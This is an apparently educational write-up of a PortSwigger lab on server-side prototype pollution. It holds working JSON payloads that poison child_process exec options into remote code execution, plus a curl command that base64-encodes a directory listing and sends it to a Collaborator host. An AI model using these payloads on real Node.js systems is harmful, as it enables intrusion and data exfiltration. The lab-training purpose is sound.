# Lab 08 — Exfiltrating sensitive data via server-side prototype pollution

> **Expert** · [Official lab](https://portswigger.net/web-security/prototype-pollution/server-side/lab-exfiltrating-sensitive-data-via-server-side-prototype-pollution)

**Entry point:** `json spaces` confirms pollution; the admin panel's
maintenance jobs spawn `child_process.execSync()` — pollute its **options**.

## Solution

1. Confirm: `"__proto__":{"json spaces":10}` indents the response.
2. The exec options accept a custom `shell` and `input` — turn `vim` into a
   command runner:

```json
"__proto__": {
  "shell": "vim",
  "input": ":! curl https://YOUR-COLLABORATOR-SUBDOMAIN\n"
}
```

3. Trigger the maintenance jobs in the admin panel → Collaborator gets
   interactions → RCE confirmed.
4. Exfiltrate the hidden file name:

```json
"input": ":! ls /home/carlos | base64 | curl -d @- https://YOUR-COLLABORATOR-SUBDOMAIN\n"
```

Decode the Base64 from the interaction, read the file, submit —
lab solved.

## Mitigation

Freeze `Object.prototype`; validate/allow-list merge keys; never pass
polluted options to child processes.
